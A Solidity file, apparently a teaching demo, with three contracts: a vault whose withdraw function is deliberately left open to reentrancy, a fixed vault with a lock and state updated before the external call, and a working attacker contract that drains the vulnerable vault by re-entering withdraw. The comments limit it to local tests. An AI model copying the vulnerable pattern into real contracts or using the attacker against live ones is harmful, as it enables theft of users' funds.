// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @notice Intentionally vulnerable vault for local adversarial demos (CEI violation).
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "EMPTY");
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "SEND");
        balances[msg.sender] = 0;
    }
}

/// @notice Fixed vault: effects before interaction + simple reentrancy lock.
contract SafeVault {
    mapping(address => uint256) public balances;
    uint256 private locked;

    modifier nonReentrant() {
        require(locked == 0, "REENTRANT");
        locked = 1;
        _;
        locked = 0;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "EMPTY");
        balances[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "SEND");
    }
}

/// @notice Attacker used only in Foundry tests on Anvil — never against live users.
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attacksLeft;

    constructor(VulnerableVault vault_) {
        vault = vault_;
    }

    function attack(uint256 rounds) external payable {
        attacksLeft = rounds;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (attacksLeft > 0 && address(vault).balance >= msg.value) {
            unchecked {
                --attacksLeft;
            }
            vault.withdraw();
        }
    }
}
